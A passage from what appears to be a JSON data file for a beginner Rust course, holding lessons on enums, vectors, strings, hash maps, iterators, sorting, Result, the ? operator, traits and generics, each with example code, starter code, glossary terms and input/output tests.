\"mutable\").\n- ^for _ in 0..4^ repeats 4 times; the ^_^ means \"I do not need the counter\".\n- ^print!^ prints without a newline, and ^println!()^ at the end finishes the line.\n\nOutput:\n\n~~~\nRed Green Yellow Red\n~~~\n\n## Try it\n\nIn your scratch code change ^0..4^ to ^0..7^ and watch the cycle wrap around: the lights repeat in the same order.\n\n## Your task\n\nThe ^Direction^ enum has variants ^North^, ^East^, ^South^ and ^West^ and already derives ^Debug^. Fill in two methods using ^match self^:\n\n- ^turn_right(&self)^: North becomes East, East becomes South, South becomes West, West becomes North.\n- ^opposite(&self)^: North is South, East is West, South is North, West is East.\n\nFor example ^Direction::East.opposite()^ is ^West^, and turning right from ^North^ five times prints North East South West North.","starter":"#[derive(Debug)]\nenum Direction {\n    North,\n    East,\n    South,\n    West,\n}\n\nimpl Direction {\n    fn turn_right(&self) -> Direction {\n        todo!()\n    }\n    fn opposite(&self) -> Direction {\n        todo!()\n    }\n}\n","hint":"Two match expressions over self.","terms":[{"term":"derive","def":"An instruction that asks the compiler to generate common code for a type."},{"term":"Debug","def":"A built-in ability that lets a value be printed with {:?}."},{"term":"attribute (#[...])","def":"A note to the compiler placed above an item."},{"term":"impl block","def":"The place where methods and associated functions for a type are written."},{"term":"match self","def":"Choosing code depending on which variant the method was called on."},{"term":"mut","def":"Marks a variable as changeable after it is created."}],"image":{"url":"/diagrams/rust/enum-direction.svg","caption":"Visual diagram: Enum Methods"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"north","input":"N\n","expected":"North: right=East opposite=South full-turn=East>South>West>North"},{"name":"east","input":"E\n","expected":"East: right=South opposite=West full-turn=South>West>North>East"},{"name":"south","input":"S\n","expected":"South: right=West opposite=North full-turn=West>North>East>South"},{"name":"west wraps to north","input":"W\n","expected":"West: right=North opposite=East full-turn=North>East>South>West"},{"name":"all four","input":"N\nE\nS\nW\n","expected":"North: right=East opposite=South full-turn=East>South>West>North\nEast: right=South opposite=West full-turn=South>West>North>East\nSouth: right=West opposite=North full-turn=West>North>East>South\nWest: right=North opposite=East full-turn=North>East>South>West"}],"usesInput":true,"hasHarness":true}]},{"id":"collections","title":"Collections & Iterators","lessons":[{"id":"vec-basics","number":"7.1","title":"Vectors","content":"## What is a collection?\n\nSo far each variable held one value. A **collection** is a single variable that holds many values at once, like a shopping list holds many items. The most common collection in Rust is the **vector**: a growable list of values that all have the same type. Its type is written ^Vec<T>^, where ^T^ stands for the type of the items, for example ^Vec<i32>^ is a vector of integers.\n\nEach item in a vector is called an **element**. Each element has an **index**: its position number, counting from 0. In ^[10, 20, 30]^ the element at index 0 is 10 and the element at index 2 is 30.\n\n## Example: making and reading a vector\n\n~~~\nfn main() {\n    let mut v = Vec::new();\n    v.push(10);\n    v.push(20);\n    let w = vec![1, 2, 3];\n    println!(\"{} {:?}\", v.len(), w);\n    for x in &w {\n        println!(\"{}\", x);\n    }\n}\n~~~\n\n- ^let mut v = Vec::new();^ makes an empty vector. ^mut^ (mutable) is needed because we will change it.\n- ^v.push(10);^ adds 10 to the end of the vector. ^push^ is a **method**: a function that is called on a value with a dot.\n- ^let w = vec![1, 2, 3];^ builds a vector with starting elements. ^vec!^ is a **macro** (a shortcut that ends in ^!^ and writes code for you).\n- ^v.len()^ returns how many elements the vector has.\n- ^{:?}^ inside ^println!^ is the **debug format**: it prints a whole collection, such as ^[1, 2, 3]^.\n- ^for x in &w^ is a loop that **iterates** (visits each element one after another, in order). ^&w^ lends the vector to the loop without giving it away.\n\nOutput:\n\n~~~\n2 [1, 2, 3]\n1\n2\n3\n~~~\n\n## Slices: passing vectors to functions\n\nA **slice** is a borrowed view of a run of elements, written ^&[T]^, for example ^&[i32]^. It lets a function read a vector (or an **array**, a fixed-size list like ^[1, 2, 3]^ that can never grow) without taking it over. Functions that only need to read a list should take a slice.\n\nWhen you loop over a slice with ^for &x in v^, the ^&x^ pattern copies each number into ^x^ so you can use it like a normal integer. An element is even when ^x % 2 == 0^ (the remainder after dividing by 2 is zero).\n\n## Try it\n\nIn the example, change ^v.push(20);^ to also push 30, then print ^v.len()^ again. What does it print now?\n\n## Your task\n\nWrite a function ^fn sum_evens(v: &[i32]) -> i32^ that returns the sum of the even numbers in the slice. Keep a ^mut total^ starting at 0, loop over the slice, and add each even number.\n\n- ^sum_evens(&[1, 2, 3, 4, 5, 6])^ is ^12^ (2 + 4 + 6)\n- an empty slice gives ^0^\n- ^sum_evens(&[-2, -4, 5])^ is ^-6^\n\nThe tests feed a line of numbers on stdin to your function.","starter":"fn sum_evens(v: &[i32]) -> i32 {\n    todo!()\n}\n","hint":"Loop with for &x in v and add when x % 2 == 0.","terms":[{"term":"collection","def":"One variable that holds many values at once."},{"term":"Vec<T>","def":"A growable list of values that all have type T."},{"term":"element","def":"One item stored inside a collection."},{"term":"index","def":"The position number of an element, starting at 0."},{"term":"slice (&[T])","def":"A borrowed view of a run of elements that you can read."},{"term":"iterate","def":"To visit each element one after another."},{"term":"push","def":"A vector method that adds an element to the end."},{"term":"vec!","def":"A macro that builds a vector from a list of values."}],"image":{"url":"/diagrams/rust/vec-basics.svg","caption":"Visual diagram: Vectors"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"mixed numbers","input":"1 2 3 4 5 6\n","expected":"12"},{"name":"empty list","input":"\n","expected":"0"},{"name":"only odds","input":"7 9\n","expected":"0"},{"name":"negatives","input":"-2 -4 5\n","expected":"-6"},{"name":"single even","input":"8\n","expected":"8"},{"name":"zero and duplicates","input":"0 2 2\n","expected":"4"}],"usesInput":true,"hasHarness":true},{"id":"vec-build","number":"7.2","title":"Building Vectors","content":"## Building a vector and returning it\n\nA function can create a vector, fill it, and hand it back to the caller. The pattern is: make an empty vector, **push** elements in a loop, then return it. Because the vector is **owned** (it belongs to the variable), returning it moves it out of the function to the caller.\n\nA **range** like ^1..=n^ is a sequence of whole numbers from 1 up to and including n. (^1..n^ without ^=^ stops just before n.)\n\n## Example\n\n~~~\nfn evens(n: u32) -> Vec<u32> {\n    let mut out = Vec::new();\n    for i in 1..=n {\n        if i % 2 == 0 {\n            out.push(i);\n        }\n    }\n    out\n}\n\nfn main() {\n    println!(\"{:?}\", evens(7));\n}\n~~~\n\n- ^fn evens(n: u32) -> Vec<u32>^ takes an unsigned (never negative) integer and gives back a vector of them.\n- ^let mut out = Vec::new();^ starts with an empty vector we can add to.\n- ^for i in 1..=n^ runs the body once for each number from 1 to n, putting that number in ^i^.\n- ^if i % 2 == 0^ keeps only even numbers.\n- ^out.push(i);^ adds ^i^ to the end of the vector.\n- ^out^ on the last line has no semicolon, so it is the value the function returns.\n- ^{:?}^ prints the whole vector.\n\nOutput:\n\n~~~\n[2, 4, 6]\n~~~\n\n## Try it\n\nChange ^evens(7)^ to ^evens(0)^. The range ^1..=0^ is empty, so the loop never runs and you should see ^[]^, an empty vector.\n\n## Your task\n\nWrite ^fn squares(n: u32) -> Vec<u32>^ returning ^[1, 4, 9, ... n*n]^: the squares of 1 up to n. For ^0^ it returns an empty vector.\n\n- ^squares(5)^ prints ^[1, 4, 9, 16, 25]^\n- ^squares(0)^ prints ^[]^\n- ^squares(1)^ prints ^[1]^\n\nThe tests give ^n^ on stdin and print your vector with ^{:?}^.","starter":"fn squares(n: u32) -> Vec<u32> {\n    todo!()\n}\n","hint":"for i in 1..=n { out.push(i * i); }","terms":[{"term":"owned","def":"A value that belongs to one variable, which cleans it up when it goes away."},{"term":"range (1..=n)","def":"The whole numbers from 1 up to and including n."},{"term":"return","def":"Hand a value back to whoever called the function."},{"term":"u32","def":"An unsigned 32-bit integer: a whole number that is never negative."},{"term":"{:?}","def":"Debug format, which prints a whole collection."}],"image":{"url":"/diagrams/rust/vec-build.svg","caption":"Visual diagram: Building Vectors"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"five","input":"5\n","expected":"[1, 4, 9, 16, 25]"},{"name":"zero is empty","input":"0\n","expected":"[]"},{"name":"one","input":"1\n","expected":"[1]"},{"name":"ten","input":"10\n","expected":"[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]"},{"name":"three","input":"3\n","expected":"[1, 4, 9]"}],"usesInput":true,"hasHarness":true},{"id":"string-palindrome","number":"7.3","title":"Working with Strings","content":"## Strings are collections of characters\n\nA **String** is text you own and can grow. A **&str** (\"string slice\") is a borrowed view of text, such as a literal ^\"hello\"^ in your code. Functions that only read text usually take ^&str^. Both store text in **UTF-8**, a standard way of storing letters from every language (and emoji) as bytes. Because of UTF-8 you cannot just ask for \"letter number 3\" by index; instead you walk through the **characters**. A **char** is one single letter, digit, or symbol, written with single quotes like ^'a'^.\n\nAn **iterator** is something that hands out values one at a time. ^s.chars()^ gives an iterator over the characters of ^s^. You can attach steps to it with dots:\n\n- ^.filter(...)^ keeps only items that pass a test\n- ^.map(...)^ changes each item into something else\n- ^.rev()^ walks the items backwards\n- ^.collect()^ gathers the items into a collection (you say which kind with a type, such as ^Vec<char>^ or ^String^)\n\nThe test or change inside ^filter^ and ^map^ is written as a **closure**: a tiny nameless function written ^|c| expression^, where the part between the bars is its input.\n\n## Example\n\n~~~\nfn main() {\n    let rev: String = \"abc\".chars().rev().collect();\n    println!(\"{}\", rev);\n\n    let letters: Vec<char> = \"a1 b2!\"\n        .chars()\n        .filter(|c| c.is_alphanumeric())\n        .collect();\n    println!(\"{:?}\", letters);\n}\n~~~\n\n- ^\"abc\".chars()^ makes an iterator over ^'a'^, ^'b'^, ^'c'^.\n- ^.rev()^ flips the order to c, b, a.\n- ^.collect()^ builds a ^String^ because the variable is declared ^let rev: String^.\n- ^|c| c.is_alphanumeric()^ is a closure that is true when ^c^ is a letter or digit.\n- ^.filter(...)^ throws away spaces and punctuation.\n- The second ^collect^ makes a ^Vec<char>^, printed with ^{:?}^.\n\nOutput:\n\n~~~\ncba\n['a', '1', 'b', '2']\n~~~\n\n## Try it\n\nChange ^\"abc\"^ to ^\"hello\"^ and see it reversed. Then change ^is_alphanumeric()^ to ^is_alphabetic()^ and notice the digits disappear.\n\n## Your task\n\nA **palindrome** reads the same forwards and backwards (like \"Racecar\"). Write ^fn is_palindrome(s: &str) -> bool^ that ignores upper/lower case and ignores anything that is not a letter or digit.\n\nSteps: filter to alphanumeric characters, map each with ^to_ascii_lowercase()^, collect into a ^Vec<char>^, build a reversed copy, and compare the two vectors with ^==^.\n\n- \"A man, a plan, a canal: Panama\" gives ^true^\n- \"hello\" gives ^false^\n- \"\" (empty) gives ^true^","starter":"fn is_palindrome(s: &str) -> bool {\n    todo!()\n}\n","hint":"Filter to alphanumerics, lowercase them, compare with the reversed sequence.","terms":[{"term":"String","def":"Owned, growable text."},{"term":"&str","def":"A borrowed view of text, such as a string literal."},{"term":"UTF-8","def":"The standard way text from all languages is stored as bytes."},{"term":"char","def":"A single letter, digit, or symbol, written in single quotes."},{"term":"iterator","def":"Something that hands out values one at a time."},{"term":"closure","def":"A small nameless function written |input| expression."},{"term":"collect","def":"Gathers the items of an iterator into a collection such as a Vec or String."},{"term":"palindrome","def":"Text that reads the same forwards and backwards."}],"image":{"url":"/diagrams/rust/string-palindrome.svg","caption":"Visual diagram: Working with Strings"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"classic sentence","input":"A man, a plan, a canal: Panama\n","expected":"true"},{"name":"not a palindrome","input":"hello\n","expected":"false"},{"name":"empty string","input":"\n","expected":"true"},{"name":"mixed case","input":"Racecar\n","expected":"true"},{"name":"two different letters","input":"ab\n","expected":"false"},{"name":"quotes and spaces","input":"No 'x' in Nixon\n","expected":"true"},{"name":"digits","input":"12321\n","expected":"true"},{"name":"digits not palindrome","input":"123\n","expected":"false"}],"usesInput":true,"hasHarness":true},{"id":"hashmap-count","number":"7.4","title":"HashMaps","content":"## Looking things up by key\n\nA **hash map** is a collection that stores pairs: a **key** and a **value**. You look a value up by its key, like finding a phone number by a person's name in a phonebook. Name = key, number = value. Each key appears only once. The type is ^HashMap<K, V>^, such as ^HashMap<String, usize>^ (text keys, whole-number values). ^usize^ is the whole-number type Rust uses for counts and sizes.\n\nA hash map lives in the standard library, so you bring it in with ^use std::collections::HashMap;^. A **hash map does not keep any order**, so when we print one we sort first.\n\nThe **entry API** is the handy way to count: ^map.entry(key)^ looks at a key's slot, ^.or_insert(0)^ puts in 0 if the key was missing, and gives back a **mutable reference** (a lent handle that lets you change the stored value). The star ^*^ **dereferences** it, meaning \"go to the value it points at\", so ^*... += 1^ adds one to the stored count.\n\n## Example\n\n~~~\nuse std::collections::HashMap;\n\nfn main() {\n    let mut scores = HashMap::new();\n    scores.insert(String::from(\"Ada\"), 10);\n    *scores.entry(String::from(\"Ada\")).or_insert(0) += 5;\n    *scores.entry(String::from(\"Bob\")).or_insert(0) += 1;\n    println!(\"{:?}\", scores.get(\"Ada\"));\n    println!(\"{:?}\", scores.get(\"Zed\"));\n}\n~~~\n\n- ^HashMap::new()^ makes an empty map.\n- ^scores.insert(key, value)^ stores a pair.\n- The first ^entry(...)^ line finds Ada (already 10) and adds 5, making 15.\n- The second ^entry(...)^ line finds no Bob, inserts 0, then adds 1.\n- ^scores.get(\"Ada\")^ returns an ^Option^: ^Some(value)^ if the key exists, or ^None^ if not.\n\nOutput:\n\n~~~\nSome(15)\nNone\n~~~\n\n## Try it\n\nChange ^scores.get(\"Zed\")^ to ^scores.get(\"Bob\")^. It should now print ^Some(1)^.\n\n## Your task\n\nWrite ^fn word_count(text: &str) -> HashMap<String, usize>^ mapping each whitespace-separated word to how many times it appears. ^text.split_whitespace()^ is an iterator over the words. For each word do ^*map.entry(w.to_string()).or_insert(0) += 1;^ (^to_string()^ turns a ^&str^ into an owned ^String^).\n\nFor \"the cat and the hat and the bat\" you get: and 2, bat 1, cat 1, hat 1, the 3. For an empty text the map is empty.\n\nThe tests print each pair sorted as ^word: count^ followed by ^distinct=N^, the number of different words.","starter":"use std::collections::HashMap;\n\nfn word_count(text: &str) -> HashMap<String, usize> {\n    todo!()\n}\n","hint":"*map.entry(w.to_string()).or_insert(0) += 1;","terms":[{"term":"hash map","def":"A collection of key and value pairs, looked up by key."},{"term":"key","def":"The label used to find an entry in a map; each key appears once."},{"term":"value","def":"The data stored under a key."},{"term":"entry().or_insert()","def":"Finds a key, inserting a starting value if it is missing."},{"term":"*","def":"Dereference: follow a reference to the value it points at."},{"term":"usize","def":"The unsigned whole-number type used for counts and sizes."},{"term":"Option","def":"Either Some(value) or None, for results that may be missing."},{"term":"use","def":"Brings a name from the standard library into scope."}],"image":{"url":"/diagrams/rust/hashmap-count.svg","caption":"Visual diagram: HashMaps"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"repeated words","input":"the cat and the hat and the bat\n","expected":"and: 2\nbat: 1\ncat: 1\nhat: 1\nthe: 3\ndistinct=5"},{"name":"empty text","input":"\n","expected":"distinct=0"},{"name":"single word","input":"hello\n","expected":"hello: 1\ndistinct=1"},{"name":"all the same","input":"a a a a\n","expected":"a: 4\ndistinct=1"},{"name":"extra spaces","input":"  Spaces   between  words \n","expected":"Spaces: 1\nbetween: 1\nwords: 1\ndistinct=3"},{"name":"case matters","input":"The the\n","expected":"The: 1\nthe: 1\ndistinct=2"}],"usesInput":true,"hasHarness":true},{"id":"iterators","number":"7.5","title":"Iterator Chains","content":"## Building a pipeline\n\nYou met iterators already: an **iterator** hands out values one at a time. Calling ^v.iter()^ on a vector or slice gives an iterator over references to its elements. You can chain **adapters** onto it, each one a step in an assembly line:\n\n- ^filter(test)^ keeps items for which the test is true\n- ^map(change)^ transforms each item\n\nAdapters are **lazy**: they do nothing by themselves, like a recipe that has not been cooked. A **consumer** such as ^sum()^, ^count()^ or ^collect()^ actually runs the pipeline and produces a final answer.\n\nThe tests are written as **closures**, tiny nameless functions: ^|x| x * 2^ means \"given x, give back x times 2\". Because ^iter()^ lends references, you often see patterns like ^|&x|^ (copy the number out of the reference) or ^|&&x|^ in ^filter^ (filter receives a reference to the reference).\n\n## Example\n\n~~~\nfn main() {\n    let v = vec![-1, 2, 3, -4, 5];\n    let total: i32 = v.iter()\n        .filter(|&&x| x > 0)\n        .map(|x| x * 2)\n        .sum();\n    println!(\"{}\", total);\n}\n~~~\n\n- ^v.iter()^ starts the pipeline over -1, 2, 3, -4, 5.\n- ^.filter(|&&x| x > 0)^ keeps only positives: 2, 3, 5.\n- ^.map(|x| x * 2)^ doubles each: 4, 6, 10.\n- ^.sum()^ is the consumer that adds them up. The type annotation ^: i32^ tells Rust what kind of number to produce.\n\nOutput:\n\n~~~\n20\n~~~\n\n## Try it\n\nChange ^x > 0^ to ^x < 0^ and run it. Only -1 and -4 remain, doubled and summed to -10.\n\n## Your task\n\nWrite ^fn sum_odd_squares(v: &[i32]) -> i32^ returning the sum of the squares of the **odd** numbers, using an iterator chain (no ^for^ loop). A number is odd when ^x % 2 != 0^ (this also works for negatives).\n\n- ^[1, 2, 3, 4, 5]^ gives ^35^ (1 + 9 + 25)\n- an empty list gives ^0^\n- ^[-3, 3]^ gives ^18^","starter":"fn sum_odd_squares(v: &[i32]) -> i32 {\n    todo!()\n}\n","hint":"v.iter().filter(...).map(...).sum()","terms":[{"term":"iterator","def":"Something that hands out values one at a time."},{"term":"adapter","def":"An iterator step such as filter or map that changes the stream of items."},{"term":"lazy","def":"Does no work until a consumer asks for the result."},{"term":"consumer","def":"A final step such as sum, count or collect that runs the chain."},{"term":"closure","def":"A small nameless function written |input| expression."},{"term":"iter()","def":"Makes an iterator over references to the elements."},{"term":"%","def":"The remainder operator: what is left after dividing."}],"image":{"url":"/diagrams/rust/iterators.svg","caption":"Visual diagram: Iterator Chains"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"one to five","input":"1 2 3 4 5\n","expected":"35"},{"name":"empty list","input":"\n","expected":"0"},{"name":"only evens","input":"2 4\n","expected":"0"},{"name":"negative odd","input":"-3 3\n","expected":"18"},{"name":"single odd","input":"7\n","expected":"49"},{"name":"all negative","input":"-1 -2 -3\n","expected":"10"}],"usesInput":true,"hasHarness":true},{"id":"sort-stats","number":"7.6","title":"Sorting & Statistics","content":"## Sorting and finding extremes\n\nTo **sort** a vector is to put its elements in order, smallest first (**ascending**). ^v.sort()^ does this in place, so the vector must be declared ^mut^. After sorting, the smallest element (the **minimum**) is at index 0 and the largest (the **maximum**) is at the last index, which is ^v.len() - 1^.\n\nTo print numbers on one line, turn each into a ^String^ with ^map(|n| n.to_string())^, collect them into a ^Vec<String>^, and glue them together with ^.join(\" \")^, which puts the given separator between the pieces.\n\nTo read input, ^read_line^ puts a line of text into a ^String^; ^split_whitespace^ cuts it into words; ^parse()^ **parses** each word, meaning it converts text such as \"42\" into the number 42. ^unwrap()^ takes the number out of the result (and crashes if the text was not a number).\n\n## Example\n\n~~~\nfn main() {\n    let mut v = vec![3, 1, 2];\n    v.sort();\n    let words: Vec<String> = v.iter().map(|n| n.to_string()).collect();\n    println!(\"{}\", words.join(\" \"));\n    println!(\"first={} last={}\", v[0], v[v.len() - 1]);\n}\n~~~\n\n- ^v.sort();^ reorders to [1, 2, 3].\n- ^v.iter().map(|n| n.to_string()).collect()^ makes the strings \"1\", \"2\", \"3\".\n- ^words.join(\" \")^ glues them with spaces: ^1 2 3^.\n- ^v[0]^ reads the element at index 0 (the minimum). ^v[v.len() - 1]^ reads the last one (the maximum).\n\nOutput:\n\n~~~\n1 2 3\nfirst=1 last=3\n~~~\n\n## Try it\n\nChange the vector to ^vec![9, -4, 7]^ and run it. Notice negatives sort before positives.\n\n## Your task\n\nThe starter already reads a line of integers into the vector ^nums^. After it, add code that sorts ^nums^ and prints three lines: the numbers sorted ascending separated by spaces, then ^max=^ and the largest, then ^min=^ and the smallest.\n\nFor the input ^5 3 9 1^ print:\n\n~~~\n1 3 5 9\nmax=9\nmin=1\n~~~\n\nYou may assume at least one number is given.","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let mut nums: Vec<i32> = line.split_whitespace().map(|s| s.parse().unwrap()).collect();\n\n}\n","hint":"After sort(), min is the first element and max is the last.","terms":[{"term":"sort","def":"Put the elements of a vector in order, smallest first."},{"term":"minimum / maximum","def":"The smallest and the largest element."},{"term":"join","def":"Glues a list of strings together with a separator between them."},{"term":"parse","def":"Convert text such as \"42\" into a number."},{"term":"unwrap","def":"Take the value out of a result, crashing if there is none."},{"term":"stdin","def":"The standard input: text typed in or fed to the program."}],"image":{"url":"/diagrams/rust/sort-stats.svg","caption":"Visual diagram: Sorting & Statistics"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"four numbers","input":"5 3 9 1\n","expected":"1 3 5 9\nmax=9\nmin=1"},{"name":"single element","input":"42\n","expected":"42\nmax=42\nmin=42"},{"name":"negatives and duplicates","input":"-1 -5 10 0 10\n","expected":"-5 -1 0 10 10\nmax=10\nmin=-5"},{"name":"all equal","input":"7 7 7\n","expected":"7 7 7\nmax=7\nmin=7"},{"name":"descending input","input":"3 2 1\n","expected":"1 2 3\nmax=3\nmin=1"}],"usesInput":true,"hasHarness":false}]},{"id":"errors-traits","title":"Errors, Traits & Generics","lessons":[{"id":"result-basics","number":"8.1","title":"Result","content":"## Things can go wrong\n\nA **function** is a named recipe of code. Some recipes can fail: turning the text \"abc\" into a number makes no sense. Rust does not hide this. A function that might fail returns a **Result**, a box that holds EITHER a success OR an error. Think of ordering a parcel: it arrives with your item, or with a \"could not deliver\" note.\n\n- **Ok(value)** is the success side: the box holds the good answer.\n- **Err(error)** is the failure side: the box holds a description of what went wrong.\n- ^Result<i32, String>^ is the type: the **<...>** part says \"success holds an ^i32^, failure holds a ^String^\".\n- To look inside the box we use **match**, which checks which side we have and runs the matching arm.\n- **parse** converts text to another type, like a number, and itself returns a ^Result^.\n\n## Example\n\n~~~\nfn parse_num(s: &str) -> Result<i32, String> {\n    match s.parse::<i32>() {\n        Ok(n) => Ok(n),\n        Err(_) => Err(format!(\"bad number: {}\", s)),\n    }\n}\n\nfn main() {\n    println!(\"{:?}\", parse_num(\"42\"));\n    println!(\"{:?}\", parse_num(\"hi\"));\n}\n~~~\n\n- ^fn parse_num(s: &str) -> Result<i32, String>^ declares a function taking text and returning a ^Result^.\n- ^s.parse::<i32>()^ tries to read the text as an ^i32^ number; the ^::<i32>^ names the wanted type.\n- ^Ok(n) => Ok(n)^: parsing worked, so pass the number on as a success.\n- ^Err(_) => ...^: parsing failed; ^_^ means \"I don't care about the details\".\n- ^format!^ works like ^println!^ but gives back a ^String^ instead of printing.\n- ^{:?}^ prints a value in \"debug\" form, which shows ^Ok(...)^ and ^Err(...)^ wrappers.\n\nOutput:\n\n~~~\nOk(42)\nErr(\"bad number: hi\")\n~~~\n\n## Try it\n\nChange ^\"hi\"^ to ^\"7\"^ and run: the second line becomes ^Ok(7)^.\n\n## Your task\n\nWrite ^parse_age^: parse a ^u8^ (a whole number 0 to 255) and return ^Ok(age)^, or ^Err(\"invalid age: <text>\")^ if it isn't a valid ^u8^ (negative, too large, or not a number). For example ^\"300\"^ gives ^Err(\"invalid age: 300\")^.","starter":"fn parse_age(s: &str) -> Result<u8, String> {\n    todo!()\n}\n","hint":"match s.parse::<u8>() { Ok(n) => Ok(n), Err(_) => Err(format!(...)) }","terms":[{"term":"Result","def":"A value that is either Ok (success) or Err (failure)."},{"term":"Ok","def":"The success side of a Result, holding the good value."},{"term":"Err","def":"The failure side of a Result, holding the error."},{"term":"match","def":"Checks which shape a value has and runs the matching arm."},{"term":"parse","def":"Converts text into another type such as a number; returns a Result."},{"term":"format!","def":"Like println! but returns a String instead of printing."},{"term":"{:?}","def":"Debug print format that shows the structure of a value."}],"image":{"url":"/diagrams/rust/result-basics.svg","caption":"Visual diagram: Result"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Ok(42)\nErr(\"invalid age: abc\")\nErr(\"invalid age: 300\")\nErr(\"invalid age: -1\")"}],"usesInput":false,"hasHarness":true},{"id":"result-question","number":"8.2","title":"The ? Operator","content":"## Passing the problem upward\n\nWriting a ^match^ for every possible failure is tiring. The **?** operator is a shortcut: put it after something that returns a ^Result^. If it is ^Ok^, ^?^ takes out the value inside and carries on. If it is ^Err^, the function stops right there and hands that error back to whoever called it. Handing an error up to the caller like this is called **error propagation**, like passing a complaint to your boss instead of fixing it yourself.\n\nTwo rules: ^?^ only works inside a function that itself returns a ^Result^, and the error types must match. A **ParseIntError** is the standard error type that ^parse^ produces for integers.\n\n## Example\n\n~~~\nfn double(s: &str) -> Result<i32, std::num::ParseIntError> {\n    let n: i32 = s.trim().parse()?;\n    Ok(n * 2)\n}\n\nfn main() {\n    println!(\"{:?}\", double(\"21\"));\n    println!(\"{:?}\", double(\"x\"));\n}\n~~~\n\n- ^s.trim()^ removes spaces around the text.\n- ^.parse()?^ parses; on failure the function returns the ^Err^ immediately.\n- ^let n: i32^ names the unwrapped number (the type tells ^parse^ what to make).\n- ^Ok(n * 2)^ wraps the final answer as a success.\n- ^main^ prints both results with ^{:?}^.\n\nOutput:\n\n~~~\nOk(42)\nErr(ParseIntError { kind: InvalidDigit })\n~~~\n\n## Try it\n\nRemove the ^?^ and read the compiler error: it explains that a ^Result^ is not a number yet.\n\n## Your task\n\nWrite ^add_strs^ that parses both strings as ^i32^ and returns their sum inside ^Ok^. Use ^?^ and no ^match^. For example ^add_strs(\"3\", \"4\")^ gives ^Ok(7)^, and ^add_strs(\"x\", \"4\")^ gives an ^Err^.","starter":"use std::num::ParseIntError;\n\nfn add_strs(a: &str, b: &str) -> Result<i32, ParseIntError> {\n    todo!()\n}\n","hint":"let x: i32 = a.trim().parse()?; ... Ok(x + y)","terms":[{"term":"?","def":"Unwraps an Ok value, or returns the Err from the function immediately."},{"term":"error propagation","def":"Passing an error up to the caller instead of handling it."},{"term":"ParseIntError","def":"The error type produced when text cannot be parsed as an integer."},{"term":"trim","def":"Removes whitespace from both ends of a string."},{"term":"Result","def":"Either Ok(value) or Err(error)."}],"image":{"url":"/diagrams/rust/result-question.svg","caption":"Visual diagram: The ? Operator"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Ok(7)\nOk(-10)\ntrue\ntrue"}],"usesInput":false,"hasHarness":true},{"id":"traits","number":"8.3","title":"Traits","content":"## A promise of abilities\n\nA **trait** is a promise that a type can do certain things, like a job description: \"anyone with this job can ^name^ themselves and ^sound^ off.\" The trait lists **methods** (functions attached to a value) without saying how each type does them. To **implement** a trait for a type means writing the real code for those methods, using ^impl Trait for Type^. A trait method may also have a **default implementation**: ready-made code types get for free unless they replace it.\n\nA **struct** is a custom type you define. ^&self^ means \"this method borrows the value it was called on\".\n\n## Example\n\n~~~\ntrait Greet {\n    fn name(&self) -> String;\n    fn hello(&self) -> String {\n        format!(\"Hello, {}!\", self.name())\n    }\n}\n\nstruct Bob;\n\nimpl Greet for Bob {\n    fn name(&self) -> String { String::from(\"Bob\") }\n}\n\nfn main() {\n    println!(\"{}\", Bob.hello());\n}\n~~~\n\n- ^trait Greet { ... }^ declares the promise.\n- ^fn name(&self) -> String;^ has no body: each type must supply it.\n- ^fn hello^ has a body, so it is the default and uses ^self.name()^.\n- ^struct Bob;^ makes an empty type.\n- ^impl Greet for Bob^ fulfils the promise by writing ^name^.\n- ^Bob.hello()^ uses the free default method.\n\nOutput:\n\n~~~\nHello, Bob!\n~~~\n\n## Try it\n\nInside ^impl Greet for Bob^ add your own ^fn hello(&self) -> String { String::from(\"Yo\") }^ to override the default; the output becomes ^Yo^.\n\n## Your task\n\nImplement ^Animal^ for ^Dog^ (name \"Dog\", sound \"Woof\") and for ^Cat^ (name \"Cat\", sound \"Meow\"). The default ^speak^ is provided. The program then prints ^Dog says Woof!^ and ^Cat says Meow!^. (The test code stores both in a ^Vec<Box<dyn Animal>>^: a **Box** is a pointer to data kept on the heap, and **dyn** means \"any type that implements this trait\", so different animals fit in one list.)","starter":"trait Animal {\n    fn name(&self) -> String;\n    fn sound(&self) -> String;\n    fn speak(&self) -> String {\n        format!(\"{} says {}!\", self.name(), self.sound())\n    }\n}\n\nstruct Dog;\nstruct Cat;\n\n// TODO: impl Animal for Dog and for Cat\n","hint":"impl Animal for Dog { fn name(&self) -> String { String::from(\"Dog\") } ... }","terms":[{"term":"trait","def":"A promise that a type can do certain things; a list of methods."},{"term":"impl","def":"Writes the real code of a trait or methods for a type."},{"term":"method","def":"A function attached to a value, called with a dot."},{"term":"default implementation","def":"Method code in a trait that types get unless they override it."},{"term":"&self","def":"The method borrows the value it is called on."},{"term":"Box","def":"A pointer that stores a value on the heap."},{"term":"dyn","def":"Marks a value of any type that implements a given trait."}],"image":{"url":"/diagrams/rust/traits.svg","caption":"Visual diagram: Traits"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Dog says Woof!\nCat says Meow!"}],"usesInput":false,"hasHarness":true},{"id":"generics","number":"8.4","title":"Generics","content":"## One recipe, many types\n\nWriting a separate \"biggest number\" function for integers, decimals and letters would be repetitive. A **generic** function uses a placeholder type, written ^T^ inside ^<...>^, standing for \"some type, decided when the function is used\", like a form with a blank to fill in.\n\nBut not every type can do everything. A **trait bound** states what the placeholder must be able to do, written ^T: Trait^. ^Display^ means \"can be printed with {}\". ^PartialOrd^ means \"can be compared with ^>^ and ^<^\". ^Copy^ means \"can be duplicated cheaply\", so we can return a value without moving it. Join bounds with ^+^. A **slice** ^&[T]^ is a borrowed view of a list of items.\n\n## Example\n\n~~~\nfn show_twice<T: std::fmt::Display>(x: T) {\n    println!(\"{} {}\", x, x);\n}\n\nfn main() {\n    show_twice(5);\n    show_twice(\"hi\");\n}\n~~~\n\n- ^<T: std::fmt::Display>^ declares placeholder ^T^ that must be printable.\n- ^x: T^ takes a value of that type.\n- ^println!^ prints it 